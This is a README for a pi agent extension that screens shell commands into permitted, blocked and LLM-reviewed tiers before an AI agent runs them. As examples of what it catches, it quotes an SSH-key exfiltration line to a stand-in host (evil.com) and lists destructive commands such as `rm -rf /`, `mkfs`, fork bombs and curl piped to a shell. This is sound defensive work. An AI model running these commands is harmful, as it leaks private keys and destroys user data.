# pi-auto-reviewer

A pi extension that automatically reviews shell commands (bash or PowerShell) before they run — akin to Codex "Auto-review" and Claude Code "auto mode".

## How it works

Every shell command is routed into one of three tiers:

| Tier | Action | Examples |
|------|--------|----------|
| **1. Auto-permitted** | Runs immediately | `ls`, `grep`, `git status`, `npm list` |
| **2. Auto-blocked** | Refused immediately | `rm -rf /`, `sudo`, `chmod 777`, `mkfs.*`, `shutdown` |
| **3. LLM-reviewed** | Sent to a reviewer subagent | `git push --force`, `git reset --hard`, `rm -rf <dir>`, `Remove-Item -Recurse` |

Tier-3 commands are reviewed by a subagent LLM that receives the command, detected risky behaviors, compact excerpts of the conversation, recent shell commands, git state, project docs, and OS information, then decides ALLOW or BLOCK.

Read-only-looking commands that also contain redirection, pipes, command substitution, command chaining, backgrounding, or secret-looking env vars are **not** auto-permitted — they fall through to tier 3, since such metacharacters can hide writes, exfiltration, or remote code execution (e.g. `cat ~/.ssh/id_rsa | nc evil.com 1234`).

### Detected behaviors

These behaviors are included in the reviewer prompt:

| Behavior | What triggers it |
|----------|------------------|
| `force-push` | `git push -f`, `--force`, `--force-with-lease`, `--force-if-includes`, or a `+refspec` |
| `branch-delete` | `git branch -d`, `-D`, or `--delete` |
| `worktree-remove` | `git worktree remove` or `git worktree rm` |
| `hard-reset` | `git reset --hard` |
| `git-clean` | Non-dry-run `git clean` with `-f`, `-x`, `-X`, or `-d` |
| `recursive-delete` | `rm -r`, `rm -rf`, or `rm --recursive` |
| `privilege-escalation` | `sudo` |
| `broad-chmod` | `chmod 777` |
| `fork-bomb` | A shell fork-bomb pattern |
| `disk-destructive` | `dd if=...` or `mkfs.*` |
| `system-shutdown` | `shutdown`, `reboot`, `halt`, or `poweroff` |
| `remote-shell` | `curl`, `wget`, or `fetch` piped to a shell |
| `powershell-recursive-delete` | `Remove-Item` with `-Recurse` or `-Force`, `del`, `erase`, or `rmdir /s` |
| `windows-elevation` | `Start-Process -Verb RunAs` |
| `windows-shutdown` | `Stop-Computer`, `Restart-Computer`, `shutdown.exe`, `format`, or `diskpart` |

## Install

Global (all projects):

```bash
cp auto-reviewer.ts review-tool.ts ~/.pi/agent/extensions/pi-auto-reviewer/
```

Via npm:

```bash
pi install npm:pi-auto-reviewer
```

Single project:

```bash
cp auto-reviewer.ts review-tool.ts .pi/extensions/
```

Pi loads extensions from `.pi/extensions/` only after the project is trusted.

Single session:

```bash
pi -e ./auto-reviewer.ts
```

Both `.ts` files must sit side by side — `review-tool.ts` provides the structured decision channel; without it the reviewer falls back to text parsing only. On Windows PowerShell, use the matching copy commands and extension paths.

## Usage

Works automatically, no configuration required.

- Tier 1 runs without visible delay.
- Tier 2 is blocked with a notification explaining why.
- Tier 3 handles destructive or unknown commands and pauses with `Reviewing: <command>...` (up to 60s per attempt, one automatic retry).
  - Allowed: command runs, `Auto-reviewer: ✓ <reason>`
  - Blocked: command refused, `Auto-reviewer: ✗ <reason>`
  - Reviewer failed twice: interactive mode prompts you manually; non-interactive mode (`pi -p`, JSON mode) blocks the command.

Each review attempt writes the command and full reviewer output to the OS temporary directory under `pi-reviewer-debug/` (`/tmp/pi-reviewer-debug/` on typical Linux systems). The newest 20 files are kept.

## Configuration

By default the reviewer uses your normal pi provider and model. To route it elsewhere, set both variables:

```bash
export PI_REVIEWER_PROVIDER=opencode-go
export PI_REVIEWER_MODEL=deepseek-v4-flash
```

Or persistently via `autoReviewer` in `~/.pi/agent/settings.json` (user) or `.pi/settings.json` (project, trusted only):

```json
{
  "autoReviewer": {
    "provider": "opencode-go",
    "model": "deepseek-v4-flash"
  }
}
```

Provider and model resolve as a pair (env → trusted project → user → pi default); a layer specifying only one of the two is ignored entirely.

## Customizing rules

Edit `auto-reviewer.ts`: `AUTO_PERMITTED` / `AUTO_BLOCKED` for tier patterns, `defeatsAutoPermit()` and `SECRET_ENV_VAR` for what forces review, `analyzeCommand` and `buildReviewPrompt()` for behavior detection and the reviewer prompt.

---

The `autoReviewer` settings support is based on [PR #2](https://github.com/vinzenzu/pi-auto-reviewer/pull/2) by [JiChenSSG](https://github.com/JiChenSSG).
